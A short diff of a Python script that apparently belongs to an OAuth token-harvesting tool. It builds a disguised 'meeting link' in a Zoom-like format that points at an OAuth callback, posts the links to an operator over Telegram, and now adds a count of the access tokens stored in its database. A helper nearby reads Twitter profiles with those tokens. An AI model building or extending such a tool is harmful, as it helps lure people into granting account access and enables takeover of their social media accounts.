@@ -131,18 +131,24 @@ def generate_code_verifier_and_challenge():
     ).rstrip(b'=').decode('utf-8')
     return code_verifier, code_challenge
 
-# Function to send a startup message with OAuth link and meeting link
+# Function to send a startup message with OAuth link, meeting link, and total tokens in the database
 def send_startup_message():
     state = "0"
     code_verifier, code_challenge = generate_code_verifier_and_challenge()
     authorization_url = CALLBACK_URL
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
-    
+
+    # Fetch the total token count from the database
+    total_tokens = get_total_tokens()
+
+    # Message content with the total tokens
     message = (
         f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
-        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
+        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})\n\n"
+        f"📊 *Total Tokens in Database:* {total_tokens}"
     )
     send_message_via_telegram(message)
+
 
 # Function to get Twitter username and profile URL using access token
 def get_twitter_username_and_profile(access_token):
